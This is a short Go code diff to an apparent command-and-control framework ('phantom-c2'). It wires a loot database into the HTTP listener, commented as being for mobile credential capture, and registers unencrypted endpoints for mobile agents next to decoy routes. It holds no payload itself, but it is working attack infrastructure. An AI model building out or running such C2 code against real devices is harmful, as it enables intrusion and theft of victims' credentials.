@@ -10,6 +10,7 @@ import (
 	"time"
 
 	"github.com/phantom-c2/phantom/internal/agent"
+	"github.com/phantom-c2/phantom/internal/db"
 	"github.com/phantom-c2/phantom/internal/crypto"
 	"github.com/phantom-c2/phantom/internal/protocol"
 	"github.com/phantom-c2/phantom/internal/task"
@@ -34,6 +35,7 @@ type HTTPListener struct {
 	taskDisp   *task.Dispatcher
 	onEvent    EventCallback
 	running    bool
+	database   interface{ InsertLoot(l *db.LootRecord) error }
 }
 
 // ListenerConfig holds the configuration for creating a new listener.
@@ -49,6 +51,7 @@ type ListenerConfig struct {
 	AgentMgr *agent.Manager
 	TaskDisp *task.Dispatcher
 	OnEvent  EventCallback
+	Database interface{ InsertLoot(l *db.LootRecord) error } // For mobile cred capture
 }
 
 // NewHTTPListener creates a new HTTP/HTTPS listener.
@@ -65,6 +68,7 @@ func NewHTTPListener(cfg ListenerConfig) *HTTPListener {
 		agentMgr: cfg.AgentMgr,
 		taskDisp: cfg.TaskDisp,
 		onEvent:  cfg.OnEvent,
+		database: cfg.Database,
 	}
 }
 
@@ -79,6 +83,15 @@ func (l *HTTPListener) Start() error {
 	// Decoy routes
 	for _, uri := range l.Profile.DecoyURIs {
 		mux.HandleFunc(uri, l.handleDecoy)
+	}
+
+	// Mobile agent endpoints (plain JSON — no encryption)
+	if l.database != nil {
+		mobileDB, _ := l.database.(*db.Database)
+		if mobileDB != nil {
+			mobileHandler := NewMobileHandler(l.agentMgr, l.taskDisp, mobileDB, l.onEvent)
+			mobileHandler.RegisterRoutes(mux)
+		}
 	}
 
 	// Catch-all for any other request
